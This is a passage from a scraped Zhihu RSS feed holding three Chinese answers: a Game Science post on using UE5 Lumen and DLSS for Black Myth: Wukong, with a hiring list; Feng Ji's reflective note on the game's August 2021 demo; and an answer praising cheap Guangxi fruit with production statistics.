data-rawwidth=\"1391\" data-rawheight=\"698\" data-watermark=\"watermark\" data-original-src=\"v2-fd646dd30287477e7069622527700453\" data-watermark-src=\"v2-aea57c7c235d7f832ff816a852a6db17\" data-private-watermark-src=\"v2-ff084a103eb10b7b13dc17c9946eeea8\"></p>\n<p><b>-Lumen</b></p>\n<p>UE5另一个非常强大的功能是Lumen全局光照。</p>\n<p>引用一段Epic官方的话：该系统能在宏大而精细的场景中渲染间接镜面反射和可以无限反弹的漫反射；小到毫米级、大到千米级，Lumen都能游刃有余。</p>\n<p>具体的技术细节这里就不多说了，大家可以看对比图感受一下Lumen的对光照品质的提升</p>\n<p>（对比图均为上图关闭lumen、下图开启lumen）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-0b8ad90480df441cb610c009c300bbad_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"706\" data-watermark=\"watermark\" data-original-src=\"v2-0b8ad90480df441cb610c009c300bbad\" data-watermark-src=\"v2-1ae317f5bbd633c0f2cabcc058f8de25\" data-private-watermark-src=\"v2-dc258b74d7a3aa5ffa9d60ba49fb37cd\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-3208627b1af1a277bb4d03c33ba939cc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"698\" data-watermark=\"watermark\" data-original-src=\"v2-3208627b1af1a277bb4d03c33ba939cc\" data-watermark-src=\"v2-a0a35fcd27b033e20f27e2760902f1f9\" data-private-watermark-src=\"v2-4f0f68d384a9312846b27b4950fe31b6\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-45502daee7f708580693a6945e89aa6c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"700\" data-watermark=\"watermark\" data-original-src=\"v2-45502daee7f708580693a6945e89aa6c\" data-watermark-src=\"v2-6e720b56c38479b28a8be98f10968293\" data-private-watermark-src=\"v2-43b1297f9eda5455dfed28f1e9b702c2\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-3982bb6349b87667a163945b0621c1cc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"700\" data-watermark=\"watermark\" data-original-src=\"v2-3982bb6349b87667a163945b0621c1cc\" data-watermark-src=\"v2-4e3c3cbfd437380aa32488859e2263e5\" data-private-watermark-src=\"v2-8850b668d37e16700d8a9212676aaf54\"></p>\n<p><b>-DLSS</b></p>\n<p>广大游戏玩家应该听过Nvidia DLSS的大名：Deep Learning Super Sampling。</p>\n<p>这是Nvidia在RTX平台下的性能优化神器，DLSS通过深度学习神经网络渲染媲美原生分辨率画质的画面，同时还能显著提升帧率。</p>\n<p>可以说是一种“免费午餐”。</p>\n<p>这次我们也集成了DLSS，这也是这次能够顺利实现4k录制的一个利器。</p>\n<p>下图可以看到，基本不变的画面，帧率从44.72提升到71.42（RTX2060@1080p，DLSS开启Balanced模式）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fd3b03bba069566f7e9c68c1dfc71c60_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1383\" data-rawheight=\"734\" data-watermark=\"watermark\" data-original-src=\"v2-fd3b03bba069566f7e9c68c1dfc71c60\" data-watermark-src=\"v2-258df9cede19ac4e8643eed324839707\" data-private-watermark-src=\"v2-129e3d2060ab413e76f3f9d9c0e98bce\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d8c4ab9624c43a0fb504f3bf9f35874c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1385\" data-rawheight=\"728\" data-watermark=\"watermark\" data-original-src=\"v2-d8c4ab9624c43a0fb504f3bf9f35874c\" data-watermark-src=\"v2-23bae031a5298ef1947c6506760f834a\" data-private-watermark-src=\"v2-4ae2dd84da5b39f7ad93a071a2734eb2\"></p>\n<p><b>-后续我们会做什么？</b></p>\n<p>由于我们从拿到UE5到完成视频录制大概只有两个多月的时间，这次视频的制作时间可以说是非常紧张，实际上我们还有非常多的适配、优化工作没有完成，还没有完全发挥引擎的威力。无论画质提升和性能优化，依旧有非常大的空间。</p>\n<p>这次的开发也给了我们很大的信心，目前来看性能优化的进度是稳步前进的。我们的目标依然是瞄准主流玩家的pc配置。所以目前广泛使用的显卡（当然是指独立显卡 XD），我们是会全力支持适配的，各位担心显卡会燃烧的玩家请放心~<br></p>\n<p><b>-We're still Hiring！</b></p>\n<p>是的，我们<b> 仍 然 </b>在招聘。</p>\n<p>在这个视频中展示了非常多优秀的特性也都需要归功于各位同事出色的工作，比如可互动的雪地、破碎冰面、龙的各种动画机制等等，这些都离不开优秀成员的加入。</p>\n<p>去年大家热情澎湃，我们收到惊人多的简历（真的非常非常非常多），但由于招聘人数和投递人数的比例非常夸张，所以很多朋友没有加入我们，只是因为缘分未到，很多朋友真的非常优秀，也再次感谢大家对我们的支持。</p>\n<p>具体的职位，可以参考下面的列表，或者到招聘渠道中了解相关信息。</p>\n<p><b>同时也提醒大家，由于私信非常容易遗漏，也给统计简历信息带来非常大的困难，希望大家都通过官方渠道（见下面，包括拉钩和招聘邮箱）投递简历，谢谢大家的理解！</b><br></p>\n<p>完整招聘岗位列表请见官网：</p>\n<p><a href=\"http://link.zhihu.com/?target=http%3A//www.heishenhua.com/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">《黑神话：悟空》官网</a></p>\n<p><br></p>\n<p>简历投递</p>\n<p><u>拉钩：<a href=\"http://link.zhihu.com/?target=https%3A//hr.lagou.com/company/gongsi/j36721.html\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">hr.lagou.com/company/go</span><span class=\"invisible\">ngsi/j36721.html</span><span class=\"ellipsis\"></span></a></u></p>\n<p>邮箱：<u><a href=\"mailto:hr@gamesci.com.cn\">hr@gamesci.com.cn</a></u></p>\n<p><br></p>\n<p>技术：</p>\n<p>UE图形程序</p>\n<p>UE渲染TA</p>\n<p>UE动画开发</p>\n<p>后台开发工程师</p>\n<p>IT运维工程师<br></p>\n<p>产品：</p>\n<p>游戏编剧<br></p>\n<p>设计：</p>\n<p>剧情动画设计师</p>\n<p>关卡动画设计师</p>\n<p>3D特效设计师</p>\n<p>动捕操作员</p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/uddwilliam?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">招招</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/481112589/answer/2072119480?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1626 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/480857493?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">通过本次的预告站，你认为游戏《黑神话：悟空》有哪些需优化的地方？</a><br><a href=\"http://www.zhihu.com/question/480849849?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价游戏《黑神话：悟空》8 月 19 日上线的预告站，透露了哪些信息？</a><br>\n","link":"http://www.zhihu.com/question/481112589/answer/2072119480?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"8 月 20 日游戏科学放出《黑神话：悟空》 UE5 实机内容演示，有哪些新信息？","date":"2021-08-20 03:00:10","description":"\n<p><b>视频集锦，莫要轻信。蒙君垂目，砥砺前行。</b></p>\n<p><br></p>\n<p>上一年曾祝大家睡到自然醒，结果从去年的820到今天，我自己这一年的睡眠反而不太行……</p>\n<p>非要形容这个状态的话，大概就是战战兢兢，如履薄冰，才不配位，强装镇定。</p>\n<p>不仅因为第一部视频发布后的关注度与期待值，远远超越我们最乐观的预期。</p>\n<p>更因为做游戏视频，比做游戏简单得多；而做游戏，又比做一个好玩的游戏简单得多。</p>\n<p>关注越大，责任越大。</p>\n<p>中途的调整、失误与花边，也越容易被放大。</p>\n<p><br></p>\n<p>哪怕时隔了整整一年，我依然不时产生如“为啥有这么多人在看着”的不真实感，以及两种之前不曾有过的情绪。</p>\n<p><b>一是恐惧。</b>一边频繁感受到大家热切而真诚的期望，一边深知自己的能力短板与实力局限。正如庄子说“水之积也不厚，则其负大舟也无力”。在动作角色扮演的大方向上，我们的研发积累刚刚起步，用户理解严重不足，纵然竭尽全力，又岂能尽如人意？</p>\n<p><b>二是焦虑。</b>团队每天实际要面对的，永远是庞杂而具体的开发工作，其中不乏两难选择与细节魔鬼。比如：</p>\n<p>如何最大程度保留西游经典的精气神，又创作出耳目一新的故事与设定？</p>\n<p>动作乐趣的核心是什么？战斗难度的上下限在哪里？首领是更多考核肌肉反应还是规则理解？</p>\n<p>无比渴望使用最前沿的引擎技术与图形学成果，又疯狂担心变成显卡危机与煎蛋利器</p>\n<p>猴子本身作为一个神通广大的神话英雄，在还原招牌能力与法术时，怎样才能不破坏关卡体验的稳定与量产？</p>\n<p>所谓“史诗感”，“大作气质”，“次世代范儿”到底重点是啥？不计成本的细节堆砌？超高的内容完成度？数百分钟的剧情表演与数百万字的配音文本？</p>\n<p>每加入一个自以为牛逼的新特性与新技术，距离项目全局进度失控的开发地狱便更进一步。而且由于大多数时候都在无人区摸索，所有的坑都得亲自趟过一次，或者好几次……</p>\n<p>所以昨日预告站的几个小视频，绝非刻意调侃的事后玩笑，而是漫长研发历程中苦中作乐的无奈自嘲。这些看似荒诞的BUG与困局，只是这几年层出不穷奇葩事故的冰山一角。此时此刻它们不但没有消失，反而子孙满堂活得贼好。</p>\n<p><br></p>\n<p>可能有朋友知道，我前段时间在猛看东京奥运会。</p>\n<p>其中最打动我的，不是摘取金牌的高光时刻，而是两次中国队失利时主将的眼泪。</p>\n<p>一次是小枣，她哭着说对不起大家，辜负了大家。</p>\n<p>一次是郎导，她同样因为对不起球迷而数度哽咽。</p>\n<p>她们已是各自领域难以超越的巅峰，尤其是郎导，可谓创造竞技体育不二历史的女性传奇，心智之成熟坚韧想必远超常人。但即便如此，尚且难以在被淘汰后克制住自己辜负他人期待的负罪之情。</p>\n<p>我不配说能感同身受体会她们的心情，但那充满歉意的泪水，一定是真实的。</p>\n<p>哪怕过程中付出所有，没有达到预期的结果就会难过，甚至更加难过。</p>\n<p>因为你清楚地知道，有那么多人在爱着你。</p>\n<p><br></p>\n<p>我们没有资格说自己苦，太多人比我们更苦，更努力，压力更大。</p>\n<p>我们也没有资格说自己做出了什么成绩，因为本就没有成绩值得一提。</p>\n<p>我们只是想在认准的方向，以平常心走下去。慢慢走，争取走远一点，邂逅更多有爱的伙伴，探开更多未知的迷雾。如果在路上偶遇几只可爱的妖精，只当是别样的风景，心如止水，安之若素。</p>\n<p><b>今年制作这部视频的初衷，依然是希望所有关心游戏科学与黑神话的朋友，在看完之后能再放心一丢丢——知道我们仍在那条小路上从容的晃荡，队伍日渐壮大，产出稳定顺滑。</b>虽说一年能走的总步数有限，减肥的初心从未改变。各位若平日还有闲情，也不妨多做几个深蹲与俯卧撑，而不是老惦记那个并不存在的发布时辰[狗头]</p>\n<p><br></p>\n<p>最后，我想再提一次中国女排。她们作为上届里约奥运会的卫冕冠军兼2019年世界杯冠军，经过了五年艰苦卓绝的备战，却在本届小组赛出师不利，遭遇三连败后惨遭淘汰，这也是1984年洛杉矶以来女排在奥运会的最差成绩。但就在“历史最低排名”仅仅两天后，她们在第四轮又用一个3:0，豪迈击溃了此前三战全胜小组排名第一的意大利队。赛后所有队员与教练组开心地抱成一团，脸上的笑容如花般灿烂。</p>\n<p>这样豁达、投入、尽情享受当下比赛（在已无法出线的背景下）的痛快状态，让我似乎看到了女排精神的另一面。当时心有所感，跑到微博为姑娘们写了一段顺口溜，少许改动后偷懒放在这里，与诸君共勉：</p>\n<blockquote>翻过那座山，前方是爬不完的峰峦<br>趟过那条河，身上是拧不干的冷汗<br>蟠桃宴的座次与你无关<br>生死簿的名字涂抹增删<br>命运的绝句从不押韵<br>英雄的结局大多平淡，偶尔不堪<br>意料之外的金刚琢，永不回岸的无底船<br>每个传奇的故事里，都没有白给的仙丹<br>祝福所有的泪与伤，血与汗，梦想与苦难<br>唯愿你认真享受每一场战斗<br>肆无忌惮的格挡、闪避、变化、呼喊<br>用尽全部运气与勇敢<br>饱尝一切荣辱与悲欢</blockquote>\n<p><br></p>\n<p>黑猴子已足够幸运，这篇回答也已足够矫情，再次感谢各位的关注、垂青与批评。</p>\n<p>那些始终相信我们的人，我一直看得到你们，除了把事做好，无以为报。</p>\n<p>来日方长，祝身心健康。</p>\n<p><br></p>\n<p><br></p>\n<p>（了解最新的招聘信息访问 <a href=\"http://link.zhihu.com/?target=http%3A//www.heishenhua.com/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">www.heishenhua.com</a>。恳请合规投递，切莫私信联系）</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yocar?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">冯骥</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/481112589/answer/2072044600?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1626 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/480857493?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">通过本次的预告站，你认为游戏《黑神话：悟空》有哪些需优化的地方？</a><br><a href=\"http://www.zhihu.com/question/480849849?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价游戏《黑神话：悟空》8 月 19 日上线的预告站，透露了哪些信息？</a><br>\n","link":"http://www.zhihu.com/question/481112589/answer/2072044600?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"有哪些事是你到广西才知道的？","date":"2021-08-19 08:04:23","description":"\n<p>知乎对广西这宝藏地的讨论还有点少诶，给大家安利一下他们的水果。</p>\n<p><br></p>\n<p><b>10块钱以上的水果，滚出广西！(不是)</b></p>\n<p><br></p>\n<p>之前向大家安利<a href=\"http://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMjM5NjAxMjM4MA%3D%3D%26mid%3D2652330753%26idx%3D1%26sn%3D3becc0e388cdfb1fccc62e723684be46%26chksm%3Dbd0c33328a7bba24a481fb039d0812d66aba694faccb6588b8c0fc105436733c06ab786d6cab%26scene%3D21%23wechat_redirect\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">徐闻菠萝</a>的时候，我也曾怀着一颗虔诚的吃货之心搜刮了国内各个地方好吃的水果代表</p>\n<p>比如川渝地区的丑柑耙耙柑，东北地区的草莓，新疆的香梨大枣葡萄，陕西的苹果猕猴桃等等</p>\n<p><img src=\"https://pic4.zhimg.com/v2-66882765c9bcc028a5aef11a0336392a_720w.jpg?rss\" data-rawwidth=\"322\" data-rawheight=\"270\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-66882765c9bcc028a5aef11a0336392a\" data-watermark-src=\"v2-c4d7329619fa42dd90585411bee9e7ff\" data-private-watermark-src=\"v2-9de9f11d3e3ef49415aee3fb04cbe0e4\"></p>\n<p>在此过程中，我有一个惊奇的发现，那就是只要提到水果，广西的呼声真的惊人的高</p>\n<p>没别的原因，实在是广西的<b>水果种类也太多了</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-d1f25cfad8cc674fc76567072041c628_720w.jpg?rss\" data-rawwidth=\"556\" data-rawheight=\"128\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-d1f25cfad8cc674fc76567072041c628\" data-watermark-src=\"v2-4e2702fa619db43d9466a0f02ba6a07d\" data-private-watermark-src=\"v2-6dc2f77ec6fe828d779b4bd2dc92a801\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-a5c7731bbbf2c39cb66f3f5e33aa43b7_720w.jpg?rss\" data-rawwidth=\"557\" data-rawheight=\"130\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-a5c7731bbbf2c39cb66f3f5e33aa43b7\" data-watermark-src=\"v2-3cb37d7bb8bd5d5c2ea8dfafafbf6476\" data-private-watermark-src=\"v2-b381e49139b028557f402313a7a0a2b9\"></p>\n<p>你能想到的日常的不日常的见过的没见过的水果，从地里挖的到树上结的到藤上挂的，广西好像都有</p>\n<p>最关键的是，人家不仅多，还贼便宜</p>\n<p>红心火龙果10块钱9个</p>\n<p><img src=\"https://pic3.zhimg.com/v2-9ec506f964c19342a5ee12019a95c3fd_720w.jpg?rss\" data-rawwidth=\"400\" data-rawheight=\"604\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-9ec506f964c19342a5ee12019a95c3fd\" data-watermark-src=\"v2-0c813ec42a5c9f618a314f462126aee5\" data-private-watermark-src=\"v2-0dc5e63890be3d1333d9dd71a6d0f444\"></p>\n<p>2.5一斤的这大芒果！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a0827afa905236326f1fcf5ca1063c00_720w.jpg?rss\" data-rawwidth=\"622\" data-rawheight=\"458\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-a0827afa905236326f1fcf5ca1063c00\" data-watermark-src=\"v2-bc8c8a5c33ef5cc6cbd50dec5227ce03\" data-private-watermark-src=\"v2-6d227bd21f41701dd4e3431055ec5aa7\"></p>\n<p>1.5一斤的这大香蕉！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-17ab12cd91a948b7823a44dd70520e95_720w.jpg?rss\" data-rawwidth=\"594\" data-rawheight=\"335\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-17ab12cd91a948b7823a44dd70520e95\" data-watermark-src=\"v2-a7a6d1d739d15d81106e830615379f4b\" data-private-watermark-src=\"v2-892adce4e5c2e0bc1cf262f1fc71f1fa\"></p>\n<p>一块钱一斤的这是李还是别的什么玩意儿我也不敢瞎说</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4d7646c7a317700b6af79e7d880e36b5_720w.jpg?rss\" data-rawwidth=\"612\" data-rawheight=\"662\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4d7646c7a317700b6af79e7d880e36b5\" data-watermark-src=\"v2-b3c210e041c5a3b321ef6306c7fe6158\" data-private-watermark-src=\"v2-103eb411c49ff2a30f8ce680d252b865\"></p>\n<p>甚至连以娇气难伺候著称的奢侈杨梅也罕见的卖出了个位数的价格</p>\n<p><img src=\"https://pic3.zhimg.com/v2-683478b495c562eb4dd4b04f4c1288bb_720w.jpg?rss\" data-rawwidth=\"548\" data-rawheight=\"694\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-683478b495c562eb4dd4b04f4c1288bb\" data-watermark-src=\"v2-807d60b18ff611301d445286bdbb2033\" data-private-watermark-src=\"v2-d3cecc7f2c13ebd8eeec13f2dcc7dd54\"></p>\n<p>据凡尔赛协会广西分会的朋友介绍：</p>\n<p>图上这价算贵的，9毛一斤的大桃你见过吗？</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8c4be8545540248468a84af25904bdd8_720w.jpg?rss\" data-rawwidth=\"472\" data-rawheight=\"499\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-8c4be8545540248468a84af25904bdd8\" data-watermark-src=\"v2-64988c9c5cc0cc7f77d966b423317d8c\" data-private-watermark-src=\"v2-87027e9ea510030bb396ae54c9fa4749\"></p>\n<p>毕竟，在广西除了榴莲以外，不配有水果10元以上</p>\n<p>听到高于10元的水果我转身就走，因为它下个礼拜就10元3斤了</p>\n<p><img src=\"https://pic3.zhimg.com/v2-41f98371e3b79ca39adaae4f4abcad5c_720w.jpg?rss\" data-rawwidth=\"604\" data-rawheight=\"292\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-41f98371e3b79ca39adaae4f4abcad5c\" data-watermark-src=\"v2-4f62a1590b7234b9eeace2e91be7ef29\" data-private-watermark-src=\"v2-38d8ea3356d217212c9849af4ded1ace\"></p>\n<p>众所周知，夏天正是吃水果的季节</p>\n<p>所以这两天，一场以【水果自由】为主题的凡尔赛大会正在如火如荼的进行</p>\n<p><img src=\"https://pic4.zhimg.com/v2-bdbf372899aef8b9b7904d2b91e2394f_720w.jpg?rss\" data-rawwidth=\"1080\" data-rawheight=\"1039\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-bdbf372899aef8b9b7904d2b91e2394f\" data-watermark-src=\"v2-7ee0005877b4d8c4c622eafef71f5d40\" data-private-watermark-src=\"v2-b5efb30e358b66321865556147c1e899\"></p>\n<p>当然了，参赛者大部分来自广西</p>\n<p>发言内容包括但不局限于：</p>\n<p><b>不都这个价？</b></p>\n<p><b>这还便宜？</b></p>\n<p><b>我都当饭吃！</b></p>\n<p><b>我都快吃腻了~</b></p>\n<p><b>广西人：为什们你们会觉得便宜，全国水果不都是这个价吗？</b></p>\n<p>外省网友：真不是这个价</p>\n<p><img src=\"https://pic3.zhimg.com/v2-78c56a20b16992ef53cee871930e63ac_720w.jpg?rss\" data-rawwidth=\"754\" data-rawheight=\"88\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-78c56a20b16992ef53cee871930e63ac\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-b54aae5ccf75aa3d7d995b2ef9e2aa2a_720w.jpg?rss\" data-rawwidth=\"973\" data-rawheight=\"164\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-b54aae5ccf75aa3d7d995b2ef9e2aa2a\" data-watermark-src=\"v2-96981ed964a74955d091bbf040408ba5\" data-private-watermark-src=\"v2-0ba44828bbb9d1ac5e1a29e3ff915943\"></p>\n<p><b>广西人：讲真的在钦州荔枝一般俩三块一斤，杨梅也是俩三块，8块太贵了，不吃</b></p>\n<p>外省网友：之前宿舍里的广西同学从老家拿了荔枝和杨梅跟大家分享</p>\n<p>我们都很有默契的一人只拿了一个</p>\n<p>因为感觉但凡多拿一个都破费了，坐标北京</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8fdeb9a92b6dbb27a34ccb3448e1eed2_720w.jpg?rss\" data-rawwidth=\"613\" data-rawheight=\"292\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-8fdeb9a92b6dbb27a34ccb3448e1eed2\" data-watermark-src=\"v2-c7e5f1d8127d6fab1c96d1e40ccbb6fe\" data-private-watermark-src=\"v2-07f90c2238ffa1b5aa3ee72271495d21\"></p>\n<p><b>广西人：10块钱9个不够拿出来说，上次10块钱买了12个火龙果，我当饭吃</b></p>\n<p>外省网友：一点都不羡慕，因为他会窜稀</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1de1c3bf84b53cd381f852bab33efc28_720w.jpg?rss\" data-rawwidth=\"461\" data-rawheight=\"587\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-1de1c3bf84b53cd381f852bab33efc28\" data-watermark-src=\"v2-2723082aa3cc1314dc21cc2d0f8aefb2\" data-private-watermark-src=\"v2-7a88958b6614e54793c3956f08505ea9\"></p>\n<p>外省网友<b>：</b>上次去浦北县，路边遇到一个卖香蕉的老奶奶，我问怎么卖，她说4块钱</p>\n<p>我寻思这跟我想象的不一样啊，不都说广西水果便宜吗</p>\n<p>但我转念一想，老人年纪大了，腿脚不利索，出来挣点小钱卖贵点也能理解，我说给我来两斤吧</p>\n<p>然后奶奶说：<b>两斤不卖，4块钱一把</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d28806e94ad739e3bf611c3edd63145f_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"520\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-d28806e94ad739e3bf611c3edd63145f\" data-watermark-src=\"v2-ec536111c4afd6e1b9416e4dcd523557\" data-private-watermark-src=\"v2-1a20f9ab4781b79b12504652017d83fa\"></p>\n<p>广西人：这对走在路上随便一颗树都能挂满果的广西来说，真不算什么</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b2b3b19892280c3818d94cea5a1c3b72_720w.jpg?rss\" data-rawwidth=\"489\" data-rawheight=\"699\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-b2b3b19892280c3818d94cea5a1c3b72\" data-watermark-src=\"v2-a57eb59d67c4f8fafee66ae635d25fd7\" data-private-watermark-src=\"v2-fe2fe75d53aa28f4b0e214fe01870466\"></p>\n<p>以上都是网友们的感性认知，但众所周知，感性认知不靠谱</p>\n<p>那从数据上看，广西水果怎么样呢？</p>\n<p>据统计，2018年，广西以1790万吨的水果产量<b>从全国第五跃升到全国第一</b></p>\n<p>2019年，成为全国首个产量超2000万吨的水果大省（区）</p>\n<p><b>总量雄踞全国榜首</b>，分别比随后的两省区多112万吨和224万吨</p>\n<p>而且柑橘、芒果、柿子、火龙果、百香果均位列<b>全国第一</b></p>\n<p>2020年，全区水果种植面积达2058万亩，总产量超2461万吨，<b>水果产业发展成为千亿元产业</b></p>\n<p>好家伙，看了数据后我发现，网友吹广西水果，吹得还是太收着了</p>\n<p>但其实就像我开篇所说，中国地大物博，好吃的水果到处都有，完全不必搞什么拉踩</p>\n<p>但可能很多人也会有疑惑为什么处在同纬度的广东、福建，甚至更低纬度的海南，没能成为广西这样的水果大省</p>\n<p>气候完全不输啊，甚至还更湿润一些</p>\n<p>广西独占鳌头，水果种类这么齐全，它究竟为什么？</p>\n<p>两个方面一是<b>地形气候</b></p>\n<p>广西有山地有丘陵有盆地有海湾，形成了多样的种植环境，干湿分明亚</p>\n<p>热带季风区降雨丰富，日照足、各种植物都能在这里肆意生长</p>\n<p>据资料统计，目前广西现种植的水果已经多达47科85属237种</p>\n<p><img src=\"https://pic1.zhimg.com/v2-bf927dfff31784600b786758a72fb3e6_720w.jpg?rss\" data-rawwidth=\"510\" data-rawheight=\"676\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-bf927dfff31784600b786758a72fb3e6\" data-watermark-src=\"v2-ffb1c5d00173c2fe54a19c5ab466ad20\" data-private-watermark-src=\"v2-26b54ae8945fd8ff13e465532243e879\"></p>\n<p>二是<b>进口量大</b></p>\n<p>2019年，广西区域内柑产量达到1124万吨，并与俄罗斯签订了2000万斤的订单，标志着中国沃柑正式走出了国门</p>\n<p>与此同时，广西的水果进口量也是全国最多的</p>\n<p>早些年，中国和东盟国家达成了农产品零总税的合作战略</p>\n<p>各个东盟国家的农产品都可以涌入中国</p>\n<p>所以一到水果季，不止是广西的水果上市，同样季候的东盟国家的水果也跟着上市</p>\n<p>越南走陆路，泰国的走水路，芒果、山竹、榴莲等等，也给广西的水果多样性增添了色彩</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6b8b09869b041b2285677e9672c4fdb9_720w.jpg?rss\" data-rawwidth=\"541\" data-rawheight=\"639\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-6b8b09869b041b2285677e9672c4fdb9\" data-watermark-src=\"v2-6de5ff5a5ab7cf49a47266d9d1b57ea6\" data-private-watermark-src=\"v2-f347b1b2bcc2f86b160bf547f3c3c99c\"></p>\n<p>广西的水果多到什么程度呢</p>\n<p>就是你在网上下单鲜果直邮，其中80%发货地都是广西</p>\n<p>甚至还有一部分海南芒果，四川沃柑激情下单之后发现，发货地依然是广西（此处特指物美价廉的广西水果，没有鼓励虚假发货欺骗消费者的意思，那些打着头衔以次充好的无良商家，给我举报起来）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fb2318ddbf09210a5391f732feff0fb2_720w.jpg?rss\" data-rawwidth=\"935\" data-rawheight=\"310\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-fb2318ddbf09210a5391f732feff0fb2\" data-watermark-src=\"v2-cde1d72f4e8178430686723f6cc11fee\" data-private-watermark-src=\"v2-b9296d6071c58e6d0a5480d5e1f1695a\"></p>\n<p>广西的水果产业不仅让本地小伙伴们一饱口福</p>\n<p>从经济角度来说，水果还是广西五大支柱种植产业之一，带动经济超千亿</p>\n<p><b>广西全区的水果产值和农民水果收入占比达20％，更是带动农民脱贫的重要途径之一</b></p>\n<p>同时，因为广西独到的水果种植眼光，早在上个世纪七十年代就开始尝试种植一些海外引进的新品种</p>\n<p>比如牛油果，虽然在大家眼中，这个不甜不脆吃起来像嚼融化的蜡的东西，实在不能称之为水果</p>\n<p>但随着健身热的兴起，牛油果被大众看见，成为健康餐桌上的新宠回头发现，广西和云南都已建好规模化的牛油果生产基地</p>\n<p><img 